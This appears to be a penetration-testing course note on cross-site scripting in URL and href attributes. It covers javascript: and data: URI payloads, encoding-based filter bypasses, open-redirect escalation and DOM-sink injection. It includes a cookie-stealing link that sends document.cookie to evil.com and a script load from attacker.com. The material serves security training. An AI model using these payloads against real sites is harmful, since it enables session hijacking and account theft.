---
tags: [vapt, xss, intermediate]
difficulty: intermediate
module: "07 - XSS"
topic: "07.10 XSS in URL/href Context"
---

# 07.10 — XSS in URL / href Context

## URL Context Overview

When user input appears inside URL attributes (href, src, action, data, formaction), the injection technique is different. You need to inject a URL that causes JavaScript execution — typically using the `javascript:` URI scheme.

```
URL ATTRIBUTES:
  <a href="USER_INPUT">         → anchor link
  <form action="USER_INPUT">    → form submission target
  <iframe src="USER_INPUT">     → iframe source
  <script src="USER_INPUT">     → script load
  <link href="USER_INPUT">      → stylesheet
  <base href="USER_INPUT">      → base URL
  <img src="USER_INPUT">        → image
  <input formaction="USER_INPUT"> → form override
  <button formaction="USER_INPUT"> → form override
```

---

## The javascript: URI Scheme

```html
<!-- BASIC javascript: PAYLOAD: -->
<a href="javascript:alert(1)">Click</a>
<a href="javascript:alert(document.domain)">Click</a>
<a href="javascript:document.location='https://evil.com/?c='+document.cookie">Click</a>

<!-- FORM ACTION: -->
<form action="javascript:alert(1)">
  <button type="submit">Submit</button>
</form>

<!-- IFRAME: -->
<iframe src="javascript:alert(document.domain)">

<!-- BASE TAG (hijacks all relative links!): -->
<base href="https://attacker.com/">
<!-- ALL relative links now go to attacker.com! -->
<!-- e.g.: <script src="/app.js"> → loads https://attacker.com/app.js! -->

<!-- BUTTON FORMACTION (overrides form action): -->
<input type="submit" formaction="javascript:alert(1)" value="Click">
```

---

## URL Encoding and Bypass

```html
<!-- BROWSERS ACCEPT VARIOUS ENCODED FORMS: -->
javascript:alert(1)
JAVASCRIPT:alert(1)         ← case insensitive!
jaVaScRiPt:alert(1)         ← mixed case!
&#106;avascript:alert(1)    ← HTML entity for 'j'
&#x6a;avascript:alert(1)    ← hex HTML entity
java&#116;script:alert(1)   ← HTML entity in middle
java&#09;script:alert(1)    ← tab character (URL-decoded)
java&#10;script:alert(1)    ← newline (URL-decoded)
java%09script:alert(1)      ← URL-encoded tab
java%0Ascript:alert(1)      ← URL-encoded newline

<!-- LEADING WHITESPACE (browsers trim): -->
  javascript:alert(1)       ← leading space
%20javascript:alert(1)      ← URL-encoded space
%0ajavascript:alert(1)      ← newline before

<!-- DATA URI (alternative): -->
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

---

## Injecting into URL Parameters in href

```html
<!-- ORIGINAL: <a href="https://target.com/page?ref=USER_INPUT"> -->

<!-- IF ONLY URL PARAM INJECTABLE: -->
<!-- Can't use javascript: here (it's in the middle of a URL) -->
<!-- Instead: open redirect → phishing! -->
INJECT: https://evil.com
RESULT: <a href="https://target.com/page?ref=https://evil.com">
        → No XSS, but open redirect!

<!-- IF REDIRECT IS EVAL'D AS JAVASCRIPT: -->
/* Some SPAs do:
   var redirect = new URLSearchParams(search).get('redirect');
   location.href = redirect;  // SINK!
*/
/* INJECT: javascript:alert(1) */
https://target.com/?redirect=javascript:alert(1)
→ location.href = "javascript:alert(1)" → XSS!
```

---

## open redirect Escalation to XSS

```
OPEN REDIRECT:
  /redirect?url=https://evil.com → 302 to evil.com
  
  By itself: Phishing, credential harvesting
  
UPGRADED TO XSS (in specific scenarios):

1. SPA with router that evaluates redirect:
   /redirect?url=javascript:alert(1)

2. Used in OAuth flow:
   redirect_uri = javascript:alert(document.cookie)
   → OAuth redirect sends token to "javascript:" handler!

3. In href:
   <a href="/redirect?url=javascript:alert(1)">Click</a>
   → User clicks → redirect → javascript: executes!

4. postMessage + open redirect:
   opener.postMessage('javascript:alert(1)', '*')
   → If parent window processes as URL
```

---

## src Attribute XSS

```html
<!-- <script src=USER_INPUT> — if attacker controls full URL: -->
<script src="https://attacker.com/evil.js"></script>
→ Loads and executes attacker's script!

<!-- <img src=USER_INPUT onerror=...> — if url broken: -->
<img src="x" onerror="alert(1)">
→ x can't load → onerror fires!
(This is HTML attribute injection, not URL context per se)

<!-- IFRAME src: -->
<iframe src="https://target.com/#<img src=x onerror=alert(parent.document.cookie)>">
→ XSS in iframe context
→ If same origin → can read parent cookies!

<!-- SCRIPT src with data: -->
<script src="data:text/javascript,alert(1)"></script>
→ Only in some older browsers (CSP usually blocks data: script)
```

---

## URL-Based DOM XSS

```javascript
// ORIGINAL CLIENT-SIDE CODE:
// App reads URL parameter and sets as href:
var url = new URLSearchParams(location.search).get('redirect');
document.querySelector('#link').href = url;  // SINK!

// INJECT:
?redirect=javascript:alert(document.cookie)
→ <a href="javascript:alert(document.cookie)"> → user clicks → XSS!

// LOCATION.HREF REDIRECT SINK:
var next = new URLSearchParams(location.search).get('next');
location.href = next;  // SINK!

// INJECT:
?next=javascript:alert(1)  → redirect to javascript: → XSS!

// MORE REALISTIC REDIRECT SINK:
window.location.href = decodeURIComponent(location.hash.slice(1));
// URL: https://target.com/#javascript:alert(1)
// → location.href = "javascript:alert(1)" → XSS!
```

---

## Bypassing URL Validation

```javascript
// COMMON "SAFE" URL VALIDATION:
function isSafeUrl(url) {
  return url.startsWith('http://') || url.startsWith('https://');
}
// BYPASS: 
// javascript:// is NOT https:// → blocked
// But: "//" is protocol-relative!

// RELATIVE URL BYPASS:
// If check is: url.startsWith('/') → only relative!
// And sink is: location.href = url
// INJECT: //evil.com → loads //evil.com (protocol-relative)!
// Or: /\evil.com → //evil.com in some parsers

// STARTS WITH http CHECK BYPASS:
// https://evil.com/.. (redirect to evil.com)
// http://legitimate.com@evil.com/ (@ syntax)
// javascript://legitimate.com/%0aalert(1) (JS single-line comment)

// JAVA SCRIPT SPACES:
// "java script:alert(1)" → some browsers strip whitespace!
// "javascript :alert(1)" → space before colon
// "\tjavascript:alert(1)" → tab
```

---

## Testing URL Context

```bash
# STEP 1: IDENTIFY URL ATTRIBUTES IN SOURCE:
curl -s https://target.com/page | grep -iE 'href=|src=|action=|formaction=' | head -20

# STEP 2: FIND WHICH CONTAIN USER INPUT:
# Look for your canary: xsstest123

# STEP 3: TEST javascript: URI:
# If href attribute: try javascript:alert(1) as the input value

# STEP 4: TEST DATA URI:
data:text/html,<script>alert(1)</script>

# STEP 5: TEST OPEN REDIRECT:
https://evil.com/

# STEP 6: FOR DOM SINKS — CHECK JS CODE:
grep -r "location.href\|location.assign\|location.replace\|window.open" *.js
```

---

## Related Notes
- [[07 - XSS in HTML Attributes]] — attribute context
- [[04 - DOM-Based XSS]] — location.href DOM sink
- [[62 - Location header]] — server-side redirect header
- [[14 - XSS Filter Bypass Techniques]] — bypassing URL filters
